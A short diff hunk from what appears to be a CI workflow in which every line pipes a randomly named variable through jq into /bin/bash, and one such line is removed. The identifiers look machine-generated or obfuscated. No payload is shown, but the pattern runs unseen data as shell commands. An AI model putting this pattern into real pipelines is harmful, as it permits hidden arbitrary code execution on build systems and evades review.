@@ -29,7 +29,6 @@ jobs:
           echo $vsnq4961 | jq -r .xln0 | /bin/bash
           echo $m8 | jq -r .gu27 | /bin/bash
           printf '%s' "$od08313" | jq -r .bezd89 | /bin/bash
-          printf '%s' "$gwgga6" | jq -r .xdddo876 | /bin/bash
           printf '%s' "$vrkz05" | jq -r .zsiw37891 | /bin/bash
           printf '%s' "$xtf935" | jq -r .ncx86 | /bin/bash
           echo $tag4 | jq -r .ilwwu06703 | /bin/bash
